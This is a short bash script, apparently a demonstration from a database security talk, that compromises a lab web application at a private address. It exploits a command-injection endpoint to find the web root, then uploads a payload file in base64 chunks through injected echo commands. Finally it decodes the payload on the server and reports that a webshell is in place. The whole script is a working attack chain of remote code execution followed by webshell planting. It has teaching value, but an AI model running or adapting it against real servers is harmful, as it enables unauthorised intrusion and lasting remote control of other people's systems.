#!/bin/bash

#
# Quick and nasty "repeatable compromise" script
# PLUK13 Security talk (PLMCE 14,15,16)
# David Busby <david.busby@percona.com>
# Copyright 2013 Percona LLC / David Busby
#

#echo "RUH RO, I'm disabled!" && exit 1;
if [ ! -f "images.php" ]; then echo "images.php missing, exiting" && exit 1; fi
vuln_webapp="http://172.16.33.2/vuln_webapp"
#get the PWD (webdir) we're running in
echo "Phase 1 - Information gathering"
webdir=`curl -s ${vuln_webapp}/cmdi.php?cmd=pwd | grep www`
echo "I detected the webdir as $webdir"

#we're going to "split" the payload into parts and "upload" these to the webserver
echo "Phase 2 - create payload"
i=0
#zero out the file (so you can re-run this as many times as you like)
cmd="echo '' > $webdir/images.b64"
#At each step we need to URI encode the string
cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
#now using curl we execute the command agains the known vulnerable script (RCE - Remote Code Execution)
curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
#Now we're going to use the base64 binary to split the payload into smaller parts
base64 -w 100 images.php | while read chunk
do
    (( i++ ))
    chunk_inject="echo -n '$chunk' >> $webdir/images.b64"
    echo "Executing payload line $i: $chunk_inject";
    cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$chunk_inject")"
    curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
done
#Ok great we have staged the payload, however it is still base64 encoded, we need to unpack it
echo "Phase3 - unpacking payload"
cmd="base64 -d $webdir/images.b64 > $webdir/images.php"
cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
#And we're done, disaplay the link at which the payload script will run and exit
echo "Payload staged webshell should be available here $vuln_webapp/images.php"
echo "Happy hacking!"
